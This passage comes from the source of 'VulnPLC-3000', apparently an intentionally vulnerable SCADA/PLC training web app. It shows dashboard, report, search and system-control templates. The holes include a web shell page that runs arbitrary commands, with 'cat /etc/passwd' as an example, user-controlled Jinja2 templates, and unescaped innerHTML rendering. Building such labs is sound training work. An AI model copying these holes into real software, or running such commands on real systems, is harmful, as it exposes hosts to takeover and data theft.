        function getFilteredAlerts() {
            // Get filter states
            const plcFilters = {
                'PLC-1': document.getElementById('filter-plc1').checked,
                'PLC-2': document.getElementById('filter-plc2').checked,
                'PLC-3': document.getElementById('filter-plc3').checked,
                'PLC-4': document.getElementById('filter-plc4').checked
            };

            const severityFilters = {
                'CRITICAL': document.getElementById('filter-critical').checked,
                'WARNING': document.getElementById('filter-warning').checked,
                'HIGH': document.getElementById('filter-high').checked
            };

            // Filter alerts
            return alertHistory.filter(alert => {
                const plc = alert.plc || 'PLC-1'; // Default to PLC-1 for old alerts
                const severity = alert.severity || 'WARNING';

                return plcFilters[plc] && severityFilters[severity];
            });
        }

        function applyFilters() {
            updateAlertHistory();
        }

        function clearFilters() {
            // Check all filters
            document.getElementById('filter-plc1').checked = true;
            document.getElementById('filter-plc2').checked = true;
            document.getElementById('filter-plc3').checked = true;
            document.getElementById('filter-plc4').checked = true;
            document.getElementById('filter-critical').checked = true;
            document.getElementById('filter-warning').checked = true;
            document.getElementById('filter-high').checked = true;

            applyFilters();
        }

        function updateAlertHistory() {
            if (alertHistory.length === 0) {
                document.getElementById('alertHistory').classList.remove('show');
                return;
            }

            document.getElementById('alertHistory').classList.add('show');

            // Get filtered alerts
            const filtered = getFilteredAlerts();
            const recentAlerts = filtered.slice(-10).reverse(); // Last 10 filtered alerts

            // Update alert count
            const countElement = document.getElementById('alertCount');
            if (filtered.length < alertHistory.length) {
                countElement.textContent = `(Showing ${filtered.length} of ${alertHistory.length})`;
            } else {
                countElement.textContent = `(${alertHistory.length} total)`;
            }

            const content = document.getElementById('alertHistoryContent');

            if (recentAlerts.length === 0) {
                content.innerHTML = '<div style="padding: 10px; text-align: center; color: #7f8c8d;">No alerts match current filters</div>';
                return;
            }

            content.innerHTML = recentAlerts.map(alert => {
                const severityColor = {
                    'CRITICAL': '#e74c3c',
                    'HIGH': '#e67e22',
                    'WARNING': '#f39c12'
                }[alert.severity] || '#95a5a6';

                const plc = alert.plc || 'PLC-1';

                return `
                    <div style="padding: 5px 0; border-bottom: 1px solid #e0e0e0;">
                        <span style="color: ${severityColor}; font-weight: bold;">[${alert.timestamp}]</span>
                        <span style="background: #e8f4f8; padding: 2px 6px; border-radius: 3px; font-size: 11px; margin-right: 5px;">${plc}</span>
                        <span style="color: ${severityColor};">${alert.type}:</span>
                        ${alert.message}
                    </div>
                `;
            }).join('');
        }

        function exportAlerts() {
            // Get filtered alerts
            const filtered = getFilteredAlerts();

            if (filtered.length === 0) {
                alert('No alerts to export with current filters');
                return;
            }

            // Create CSV content
            const headers = ['Timestamp', 'PLC', 'Severity', 'Type', 'Message', 'Source IP', 'Function Code', 'Address'];
            const rows = filtered.map(alert => [
                alert.timestamp || '',
                alert.plc || 'PLC-1',
                alert.severity || '',
                alert.type || '',
                alert.message || '',
                alert.source_ip || '',
                `0x${(alert.function_code || 0).toString(16).padStart(2, '0')}`,
                alert.address || ''
            ]);

            // Build CSV
            let csv = headers.join(',') + '\n';
            rows.forEach(row => {
                csv += row.map(field => {
                    // Escape fields with commas or quotes
                    const str = String(field);
                    if (str.includes(',') || str.includes('"') || str.includes('\n')) {
                        return '"' + str.replace(/"/g, '""') + '"';
                    }
                    return str;
                }).join(',') + '\n';
            });

            // Download
            const blob = new Blob([csv], { type: 'text/csv' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `security_alerts_filtered_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.csv`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);
        }

        // Check for alerts every 2 seconds
        setInterval(checkSecurityAlerts, 2000);
        checkSecurityAlerts();

        console.log('ðŸ›¡ï¸ Security Alert System active - watching for attacks...');
    </script>
</body>
</html>



================================================================================
FILE: templates/report.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>Generate Report - VulnPLC-3000</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
        }
        .navbar {
            background: #2c3e50;
            color: white;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar h1 { font-size: 20px; }
        .navbar a { color: white; text-decoration: none; margin-left: 20px; }
        .container {
            max-width: 1000px;
            margin: 30px auto;
            padding: 0 20px;
        }
        .card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .card h2 {
            margin-bottom: 20px;
            color: #2c3e50;
            border-bottom: 2px solid #9b59b6;
            padding-bottom: 10px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
            color: #2c3e50;
        }
        input, select, textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            font-family: inherit;
        }
        textarea {
            min-height: 200px;
            font-family: 'Courier New', monospace;
        }
        button {
            padding: 12px 30px;
            background: #9b59b6;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover { background: #8e44ad; }
        .info-box {
            background: #e8f4f8;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #3498db;
        }
        .warning {
            background: #fff3cd;
            border-left-color: #ffc107;
            color: #856404;
        }
        code {
            background: #f4f4f4;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <h1>ðŸ“„ Generate Report</h1>
        <div>
            <a href="/dashboard">Dashboard</a>
            <a href="/logout">Logout</a>
        </div>
    </div>

    <div class="container">
        <div class="card">
            <h2>Report Generator</h2>

            <div class="info-box">
                <strong>ðŸ’¡ Tip:</strong> Use template variables like <code>{{ "{{" }} title {{ "}}" }}</code>,
                <code>{{ "{{" }} type {{ "}}" }}</code>, <code>{{ "{{" }} user {{ "}}" }}</code>,
                <code>{{ "{{" }} timestamp {{ "}}" }}</code>
            </div>

            <form method="POST" action="/operator/report">
                <div class="form-group">
                    <label>Report Title</label>
                    <input type="text" name="title" value="System Report" required>
                </div>

                <div class="form-group">
                    <label>Report Type</label>
                    <select name="type">
                        <option value="summary">Summary</option>
                        <option value="detailed">Detailed</option>
                        <option value="alarm">Alarm Report</option>
                        <option value="maintenance">Maintenance</option>
                    </select>
                </div>

                <div class="form-group">
                    <label>Custom Template (HTML with Jinja2)</label>
                    <textarea name="template" placeholder="Leave empty for default template, or enter custom HTML...">
<html>
<body>
<h1>{{ "{{" }} title {{ "}}" }}</h1>
<p><strong>Report Type:</strong> {{ "{{" }} type {{ "}}" }}</p>
<p><strong>Generated by:</strong> {{ "{{" }} user {{ "}}" }}</p>
<p><strong>Timestamp:</strong> {{ "{{" }} timestamp {{ "}}" }}</p>
<hr>
<h2>Summary</h2>
<p>This is a {{ "{{" }} type {{ "}}" }} report.</p>
</body>
</html></textarea>
                </div>

                <button type="submit">Generate Report</button>
            </form>

            <div class="info-box warning" style="margin-top: 20px;">
                <strong>âš ï¸ Advanced Users:</strong> This template engine supports Jinja2 syntax for testing purposes.
            </div>
        </div>
    </div>
</body>
</html>



================================================================================
FILE: templates/scada.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>SCADA Dashboard - VulnPLC-3000</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@3.9.1/dist/chart.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            color: #fff;
        }
        .navbar {
            background: #2c3e50;
            color: white;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar h1 { font-size: 20px; }
        .navbar a { color: white; text-decoration: none; margin-left: 20px; }
        .container {
            max-width: 1600px;
            margin: 20px auto;
            padding: 0 20px;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        }
        .stat-card h3 {
            font-size: 14px;
            opacity: 0.9;
            margin-bottom: 10px;
        }
        .stat-card .value {
            font-size: 36px;
            font-weight: bold;
            margin-bottom: 5px;
        }
        .stat-card .unit {
            font-size: 14px;
            opacity: 0.8;
        }
        .charts-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
        }
        .chart-card {
            background: #1a1a1a;
            padding: 25px;
            border-radius: 10px;
            border: 1px solid #333;
        }
        .chart-card h2 {
            margin-bottom: 20px;
            color: #00d4ff;
        }
        .alarm-panel {
            background: #1a1a1a;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #333;
            margin-top: 20px;
        }
        .alarm-panel h2 {
            color: #ff6b6b;
            margin-bottom: 15px;
        }
        .alarm-item {
            background: #2a0a0a;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
            border-left: 4px solid #ff0000;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .alarm-item.medium {
            border-left-color: #ffaa00;
            background: #2a1a0a;
        }
        .alarm-item .timestamp {
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <h1>ðŸ“Š SCADA - Supervisory Control and Data Acquisition</h1>
        <div>
            <a href="/dashboard">Dashboard</a>
            <a href="/hmi">HMI</a>
            <a href="/process">Process</a>
            <a href="/alarms">Alarms</a>
            <a href="/logout">Logout</a>
        </div>
    </div>

    <div class="container">
        <div class="stats-grid">
            <div class="stat-card" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">
                <h3>Tank Level</h3>
                <div class="value" id="stat-level">50.0</div>
                <div class="unit">%</div>
            </div>
            <div class="stat-card" style="background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);">
                <h3>Temperature</h3>
                <div class="value" id="stat-temp">25.0</div>
                <div class="unit">Â°C</div>
            </div>
            <div class="stat-card" style="background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);">
                <h3>Pressure</h3>
                <div class="value" id="stat-pressure">101.3</div>
                <div class="unit">kPa</div>
            </div>
            <div class="stat-card" style="background: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%);">
                <h3>Flow Rate</h3>
                <div class="value" id="stat-flow">15.5</div>
                <div class="unit">L/min</div>
            </div>
        </div>

        <div class="charts-grid">
            <div class="chart-card">
                <h2>Tank Level Trend</h2>
                <canvas id="chartLevel"></canvas>
            </div>
            <div class="chart-card">
                <h2>Temperature Trend</h2>
                <canvas id="chartTemp"></canvas>
            </div>
            <div class="chart-card">
                <h2>Pressure Trend</h2>
                <canvas id="chartPressure"></canvas>
            </div>
            <div class="chart-card">
                <h2>Flow Rate Trend</h2>
                <canvas id="chartFlow"></canvas>
            </div>
        </div>

        <div class="alarm-panel">
            <h2>âš ï¸ Active Alarms (<span id="alarm-count">0</span>)</h2>
            <div id="alarms-list">
                <p style="color: #888;">No active alarms</p>
            </div>
        </div>
    </div>

    <script>
        // Chart data storage
        const chartData = {
            level: [],
            temp: [],
            pressure: [],
            flow: [],
            labels: []
        };

        const maxDataPoints = 20;

        // Chart configurations
        const chartConfig = {
            type: 'line',
            options: {
                responsive: true,
                maintainAspectRatio: true,
                plugins: {
                    legend: { display: false }
                },
                scales: {
                    y: {
                        grid: { color: '#333' },
                        ticks: { color: '#888' }
                    },
                    x: {
                        grid: { color: '#333' },
                        ticks: { color: '#888' }
                    }
                }
            }
        };

        // Initialize charts
        const ctxLevel = document.getElementById('chartLevel').getContext('2d');
        const chartLevel = new Chart(ctxLevel, {
            ...chartConfig,
            data: {
                labels: chartData.labels,
                datasets: [{
                    label: 'Level',
                    data: chartData.level,
                    borderColor: '#667eea',
                    backgroundColor: 'rgba(102, 126, 234, 0.1)',
                    fill: true
                }]
            }
        });

        const ctxTemp = document.getElementById('chartTemp').getContext('2d');
        const chartTemp = new Chart(ctxTemp, {
            ...chartConfig,
            data: {
                labels: chartData.labels,
                datasets: [{
                    label: 'Temperature',
                    data: chartData.temp,
                    borderColor: '#f5576c',
                    backgroundColor: 'rgba(245, 87, 108, 0.1)',
                    fill: true
                }]
            }
        });

        const ctxPressure = document.getElementById('chartPressure').getContext('2d');
        const chartPressure = new Chart(ctxPressure, {
            ...chartConfig,
            data: {
                labels: chartData.labels,
                datasets: [{
                    label: 'Pressure',
                    data: chartData.pressure,
                    borderColor: '#00f2fe',
                    backgroundColor: 'rgba(0, 242, 254, 0.1)',
                    fill: true
                }]
            }
        });

        const ctxFlow = document.getElementById('chartFlow').getContext('2d');
        const chartFlow = new Chart(ctxFlow, {
            ...chartConfig,
            data: {
                labels: chartData.labels,
                datasets: [{
                    label: 'Flow Rate',
                    data: chartData.flow,
                    borderColor: '#38f9d7',
                    backgroundColor: 'rgba(56, 249, 215, 0.1)',
                    fill: true
                }]
            }
        });

        function updateDashboard() {
            fetch('/api/process/status')
                .then(r => r.json())
                .then(data => {
                    // Update stats
                    document.getElementById('stat-level').textContent = data.tank_level.toFixed(1);
                    document.getElementById('stat-temp').textContent = data.temperature.toFixed(1);
                    document.getElementById('stat-pressure').textContent = data.pressure.toFixed(1);
                    document.getElementById('stat-flow').textContent = data.flow_rate.toFixed(1);

                    // Update chart data
                    const now = new Date().toLocaleTimeString();
                    chartData.labels.push(now);
                    chartData.level.push(data.tank_level);
                    chartData.temp.push(data.temperature);
                    chartData.pressure.push(data.pressure);
                    chartData.flow.push(data.flow_rate);

                    // Keep only last N points
                    if (chartData.labels.length > maxDataPoints) {
                        chartData.labels.shift();
                        chartData.level.shift();
                        chartData.temp.shift();
                        chartData.pressure.shift();
                        chartData.flow.shift();
                    }

                    // Update charts
                    chartLevel.update();
                    chartTemp.update();
                    chartPressure.update();
                    chartFlow.update();
                });

            // Update alarms
            fetch('/api/alarms/list')
                .then(r => r.json())
                .then(data => {
                    const alarmsDiv = document.getElementById('alarms-list');
                    document.getElementById('alarm-count').textContent = data.alarms.length;

                    if (data.alarms.length === 0) {
                        alarmsDiv.innerHTML = '<p style="color: #888;">No active alarms</p>';
                    } else {
                        alarmsDiv.innerHTML = data.alarms.map(alarm => `
                            <div class="alarm-item ${alarm.severity.toLowerCase()}">
                                <div>
                                    <strong>${alarm.message}</strong><br>
                                    <span class="timestamp">${alarm.timestamp}</span>
                                </div>
                                <span>${alarm.severity}</span>
                            </div>
                        `).join('');
                    }
                });
        }

        // Update every 3 seconds
        setInterval(updateDashboard, 3000);
        updateDashboard();
    </script>
</body>
</html>



================================================================================
FILE: templates/search.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>Search Logs - VulnPLC-3000</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
        }
        .navbar {
            background: #2c3e50;
            color: white;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar h1 { font-size: 20px; }
        .navbar a { color: white; text-decoration: none; margin-left: 20px; }
        .container {
            max-width: 1000px;
            margin: 30px auto;
            padding: 0 20px;
        }
        .card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .card h2 {
            margin-bottom: 20px;
            color: #2c3e50;
            border-bottom: 2px solid #1abc9c;
            padding-bottom: 10px;
        }
        .search-form {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        .search-form input {
            flex: 1;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }
        .search-form select {
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }
        .search-form button {
            padding: 12px 30px;
            background: #1abc9c;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
        }
        .search-form button:hover { background: #16a085; }
        .results {
            background: #e8f4f8;
            padding: 20px;
            border-radius: 5px;
            border-left: 4px solid #1abc9c;
        }
        .results h3 {
            margin-bottom: 10px;
            color: #2c3e50;
        }
        .error {
            background: #fee;
            padding: 20px;
            border-radius: 5px;
            border-left: 4px solid #e74c3c;
            color: #c33;
        }
        .info-box {
            background: #fff3cd;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #ffc107;
            color: #856404;
        }
        code {
            background: #f4f4f4;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <h1>ðŸ” Search Logs</h1>
        <div>
            <a href="/dashboard">Dashboard</a>
            <a href="/operator/logs">My Logs</a>
            <a href="/logout">Logout</a>
        </div>
    </div>

    <div class="container">
        <div class="card">
            <h2>Search System Logs</h2>

            <div class="info-box">
                <strong>ðŸ’¡ Tip:</strong> Search logs by action, user, or details. Use wildcards for partial matches.
            </div>

            <form method="GET" action="/operator/search" class="search-form">
                <input type="text" name="q" placeholder="Search term..." value="{{ query if query else '' }}" required>
                <select name="type">
                    <option value="action" {{ 'selected' if search_type == 'action' else '' }}>Action</option>
                    <option value="user" {{ 'selected' if search_type == 'user' else '' }}>User</option>
                    <option value="details" {{ 'selected' if search_type == 'details' else '' }}>Details</option>
                </select>
                <button type="submit">Search</button>
            </form>

            {% if results is defined %}
            <div class="results">
                <h3>Search Results</h3>
                <p>Found <strong>{{ results }}</strong> matching log entries</p>
                <p>Query: <code>{{ query }}</code></p>
                <p>Type: <code>{{ search_type }}</code></p>
            </div>
            {% endif %}

            {% if error %}
            <div class="error">
                <strong>Error:</strong> {{ error }}
            </div>
            {% endif %}
        </div>

        <div class="card">
            <h2>API Usage</h2>
            <p>For programmatic access, add <code>?format=json</code> to get JSON response:</p>
            <pre style="background: #f4f4f4; padding: 15px; border-radius: 5px; overflow-x: auto;">curl "http://localhost:5000/operator/search?q=login&type=action&format=json"</pre>
        </div>
    </div>
</body>
</html>



================================================================================
FILE: templates/system.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>System Control - VulnPLC-3000</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
        }
        .navbar {
            background: #2c3e50;
            color: white;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar h1 { font-size: 20px; }
        .navbar a { color: white; text-decoration: none; margin-left: 20px; }
        .container {
            max-width: 1200px;
            margin: 30px auto;
            padding: 0 20px;
        }
        .card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .card h2 {
            margin-bottom: 15px;
            color: #2c3e50;
            border-bottom: 2px solid #e74c3c;
            padding-bottom: 10px;
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffc107;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .command-input {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        input[type="text"] {
            flex: 1;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-family: monospace;
        }
        button {
            padding: 12px 30px;
            background: #e74c3c;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover { background: #c0392b; }
        .output {
            background: #1e1e1e;
            color: #00ff00;
            padding: 20px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            min-height: 200px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .examples {
            margin-top: 20px;
            font-size: 14px;
        }
        .examples h3 { margin-bottom: 10px; color: #555; }
        .examples code {
            background: #f4f4f4;
            padding: 3px 6px;
            border-radius: 3px;
            font-family: monospace;
            display: inline-block;
            margin: 2px;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <h1>ðŸ­ VulnPLC-3000 - System Control</h1>
        <div>
            <a href="/admin">Admin</a>
            <a href="/dashboard">Dashboard</a>
            <a href="/logout">Logout</a>
        </div>
    </div>

    <div class="container">
        <div class="card">
            <h2>âš ï¸ System Command Execution</h2>
            <div class="warning">
                <strong>Warning:</strong> This interface allows direct system command execution.
                Use with caution in production environments.
            </div>

            <div class="command-input">
                <input type="text" id="command" placeholder="Enter system command (e.g., ls, pwd, whoami)" />
                <button onclick="executeCommand()">Execute</button>
            </div>

            <div id="output" class="output">Ready to execute commands...</div>

            <div class="examples">
                <h3>Example Commands:</h3>
                <code>ls -la</code>
                <code>pwd</code>
                <code>whoami</code>
                <code>cat /etc/passwd</code>
                <code>ps aux</code>
                <code>netstat -an</code>
            </div>
        </div>
    </div>

    <script>
        function executeCommand() {
            const command = document.getElementById('command').value;
            const output = document.getElementById('output');

            if (!command) {
                output.textContent = 'Error: Please enter a command';
                return;
            }

            output.textContent = `$ ${command}\n\nExecuting...`;

            const formData = new FormData();
            formData.append('command', command);

            fetch('/admin/exec', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.output) {
                    output.textContent = `$ ${command}\n\n${data.output}`;
                } else if (data.error) {
                    output.textContent = `$ ${command}\n\nError: ${data.error}`;
                }
            })
            .catch(error => {
                output.textContent = `$ ${command}\n\nNetwork Error: ${error}`;
            });
        }

        // Allow Enter key to execute
        document.getElementById('command').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                executeCommand();
            }
        });
    </script>
</body>
</html>



================================================================================
FILE: templates/trending.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>Historical Trending - VulnPLC-3000</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@3.9.1/dist/chart.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
        }
        .navbar {
            background: #2c3e50;
            color: white;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar h1 { font-size: 20px; }
        .navbar a { color: white; text-decoration: none; margin-left: 20px; }
        .container {
            max-width: 1600px;
            margin: 30px auto;
            padding: 0 20px;
        }
        .card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .card h2 {
            margin-bottom: 20px;
            color: #2c3e50;
            border-bottom: 2px solid #1abc9c;
            padding-bottom: 10px;
        }
        .controls {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .control-group {
            flex: 1;
            min-width: 200px;
        }
        .control-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
            color: #2c3e50;
        }
        .control-group select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }
        .btn {
            padding: 10px 24px;
            background: #1abc9c;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
        }
        .btn:hover {
            background: #16a085;
        }
        .chart-container {
            position: relative;
            height: 400px;
            margin-bottom: 30px;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-item {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 5px;
            border-left: 4px solid #1abc9c;
        }
        .stat-item h4 {
            font-size: 12px;
            color: #7f8c8d;
            margin-bottom: 5px;
        }
        .stat-item .value {
            font-size: 24px;
            font-weight: bold;
            color: #2c3e50;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <h1>ðŸ“ˆ Historical Trending & Analytics</h1>
        <div>
            <a href="/dashboard">Dashboard</a>
            <a href="/hmi">HMI</a>
            <a href="/scada">SCADA</a>
            <a href="/logout">Logout</a>
        </div>
    </div>

    <div class="container">
        <div class="card">
            <h2>Trend Configuration</h2>
            <div class="controls">
                <div class="control-group">
                    <label>Time Range</label>
                    <select id="time-range">
                        <option value="1">Last Hour</option>
                        <option value="6">Last 6 Hours</option>
                        <option value="24" selected>Last 24 Hours</option>
                        <option value="168">Last Week</option>
                    </select>
                </div>
                <div class="control-group">
                    <label>Update Interval</label>
                    <select id="update-interval">
                        <option value="5">5 seconds</option>
                        <option value="10" selected>10 seconds</option>
                        <option value="30">30 seconds</option>
                        <option value="60">1 minute</option>
                    </select>
                </div>
                <div class="control-group">
                    <label>&nbsp;</label>
                    <button class="btn" onclick="refreshData()">Refresh Data</button>
                </div>
            </div>
        </div>

        <div class="card">
            <h2>Statistical Summary</h2>
            <div class="stats-grid">
                <div class="stat-item">
                    <h4>Tank Level - Average</h4>
                    <div class="value" id="avg-level">--</div>
                </div>
                <div class="stat-item">
                    <h4>Temperature - Average</h4>
                    <div class="value" id="avg-temp">--</div>
                </div>
                <div class="stat-item">
                    <h4>Pressure - Average</h4>
                    <div class="value" id="avg-pressure">--</div>
                </div>
                <div class="stat-item">
                    <h4>Flow Rate - Average</h4>
                    <div class="value" id="avg-flow">--</div>
                </div>
            </div>
        </div>

        <div class="card">
            <h2>Tank Level Trend</h2>
            <div class="chart-container">
                <canvas id="chartLevel"></canvas>
            </div>
        </div>

        <div class="card">
            <h2>Temperature Trend</h2>
            <div class="chart-container">
                <canvas id="chartTemp"></canvas>
            </div>
        </div>

        <div class="card">
            <h2>Pressure Trend</h2>
            <div class="chart-container">
                <canvas id="chartPressure"></canvas>
            </div>
        </div>

        <div class="card">
            <h2>Flow Rate Trend</h2>
            <div class="chart-container">
                <canvas id="chartFlow"></canvas>
            </div>
        </div>
    </div>

    <script>
        let charts = {};

        const chartConfig = {
            type: 'line',
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        display: true,
                        position: 'top'
                    }
                },
                scales: {
                    y: {
                        beginAtZero: false,
                        grid: {
                            color: '#e0e0e0'
                        }
                    },
                    x: {
                        grid: {
                            color: '#e0e0e0'
                        }
                    }
                }
            }
        };

        function initCharts() {
            // Tank Level Chart
            const ctxLevel = document.getElementById('chartLevel').getContext('2d');
            charts.level = new Chart(ctxLevel, {
                ...chartConfig,
                data: {
                    labels: [],
                    datasets: [{
                        label: 'Tank Level (%)',
                        data: [],
                        borderColor: '#3498db',
                        backgroundColor: 'rgba(52, 152, 219, 0.1)',
                        borderWidth: 2,
                        fill: true,
                        tension: 0.4
                    }]
                }
            });

            // Temperature Chart
            const ctxTemp = document.getElementById('chartTemp').getContext('2d');
            charts.temp = new Chart(ctxTemp, {
                ...chartConfig,
                data: {
                    labels: [],
                    datasets: [{
                        label: 'Temperature (Â°C)',
                        data: [],
                        borderColor: '#e74c3c',
                        backgroundColor: 'rgba(231, 76, 60, 0.1)',
                        borderWidth: 2,
                        fill: true,
                        tension: 0.4
                    }]
                }
            });

            // Pressure Chart
            const ctxPressure = document.getElementById('chartPressure').getContext('2d');
            charts.pressure = new Chart(ctxPressure, {
                ...chartConfig,
                data: {
                    labels: [],
                    datasets: [{
                        label: 'Pressure (kPa)',
                        data: [],
                        borderColor: '#9b59b6',
                        backgroundColor: 'rgba(155, 89, 182, 0.1)',
                        borderWidth: 2,
                        fill: true,
                        tension: 0.4
                    }]
                }
            });

            // Flow Rate Chart
            const ctxFlow = document.getElementById('chartFlow').getContext('2d');
            charts.flow = new Chart(ctxFlow, {
                ...chartConfig,
                data: {
                    labels: [],
                    datasets: [{
                        label: 'Flow Rate (L/min)',
                        data: [],
                        borderColor: '#1abc9c',
                        backgroundColor: 'rgba(26, 188, 156, 0.1)',
                        borderWidth: 2,
                        fill: true,
                        tension: 0.4
                    }]
                }
            });
        }

        function refreshData() {
            fetch('/api/trending/data')
                .then(r => r.json())
                .then(data => {
                    // Update charts
                    charts.level.data.labels = data.timestamps;
                    charts.level.data.datasets[0].data = data.tank_level;
                    charts.level.update();

                    charts.temp.data.labels = data.timestamps;
                    charts.temp.data.datasets[0].data = data.temperature;
                    charts.temp.update();

                    charts.pressure.data.labels = data.timestamps;
                    charts.pressure.data.datasets[0].data = data.pressure;
                    charts.pressure.update();

                    charts.flow.data.labels = data.timestamps;
                    charts.flow.data.datasets[0].data = data.flow_rate;
                    charts.flow.update();

                    // Calculate and update statistics
                    updateStats(data);
                });
        }

        function updateStats(data) {
            const avgLevel = average(data.tank_level);
            const avgTemp = average(data.temperature);
            const avgPressure = average(data.pressure);
            const avgFlow = average(data.flow_rate);

            document.getElementById('avg-level').textContent = avgLevel.toFixed(1) + '%';
            document.getElementById('avg-temp').textContent = avgTemp.toFixed(1) + 'Â°C';
            document.getElementById('avg-pressure').textContent = avgPressure.toFixed(1) + ' kPa';
            document.getElementById('avg-flow').textContent = avgFlow.toFixed(1) + ' L/min';
        }

        function average(arr) {
            return arr.reduce((a, b) => a + b, 0) / arr.length;
        }

        // Initialize
        initCharts();
        refreshData();

        // Auto-refresh based on selected interval
        let refreshInterval = setInterval(refreshData, 10000);

        document.getElementById('update-interval').addEventListener('change', function() {
            clearInterval(refreshInterval);
            const interval = parseInt(this.value) * 1000;
            refreshInterval = setInterval(refreshData, interval);
        });
    </script>
</body>
</html>



================================================================================
FILE: templates/users.html
================================================================================
<!DOCTYPE html>
<html>
<head>
    <title>User Management - VulnPLC-3000</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
        }
        .navbar {
            background: #2c3e50;
            color: white;
